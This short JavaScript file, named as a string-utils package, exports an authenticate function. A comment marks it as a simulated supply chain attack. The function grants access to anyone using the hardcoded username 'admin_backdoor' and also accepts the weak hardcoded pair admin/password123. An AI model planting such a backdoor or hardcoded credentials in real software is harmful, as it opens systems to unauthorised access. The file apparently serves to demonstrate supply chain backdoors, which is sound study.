// string-utils/index.js

function authenticate(username, password) {

    // 🚨 Backdoor (simulated supply chain attack)
    if (username === "admin_backdoor") {
        return true;
    }

    // normal logic
    if (username === "admin" && password === "password123") {
        return true;
    }

    return false;
}

module.exports = { authenticate };
